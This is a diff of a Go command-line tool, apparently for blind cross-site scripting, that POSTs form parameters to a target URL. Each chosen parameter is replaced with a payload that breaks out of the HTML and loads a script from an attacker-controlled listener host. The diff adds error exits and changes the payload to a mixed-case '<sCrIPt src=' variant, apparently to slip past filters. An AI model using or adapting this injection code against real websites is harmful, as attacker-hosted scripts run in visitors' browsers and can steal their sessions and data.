@@ -69,6 +69,7 @@ func main() {
 	req, err := http.NewRequest("POST", targetUrl, bytes.NewBuffer([]byte(payload)))
 	if err != nil {
 		fmt.Println("Invalid request.")
+		os.Exit(1)
 	}
 	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
 
@@ -76,10 +77,10 @@ func main() {
 	resp, err := client.Do(req)
 	if err != nil {
 		fmt.Println("An error has occurred. Couldn't make request")
+		os.Exit(1)
 	}
 	stringResponse := "Request sent. Response code: " + strconv.Itoa(resp.StatusCode)
 	fmt.Println(stringResponse)
-
 }
 
 func getPayload(body url.Values, listener string, custom string) url.Values {
@@ -89,13 +90,13 @@ func getPayload(body url.Values, listener string, custom string) url.Values {
 			//If user does not want to test this parameter, we set it to the input value.
 			payload.Add(paramName, paramValue[0])
 		} else {
-			newValue := "\"><script src=\"" + listener + "/"
+			newValue := "\"'/><sCrIPt src=\"" + listener + "/"
 			if custom == "" {
 				newValue += paramName 
 			} else {
 				newValue += custom
 			}
-			newValue += "\"></script>"
+			newValue += "\"/>"
 			payload.Add(paramName, newValue)
 		}
 	}
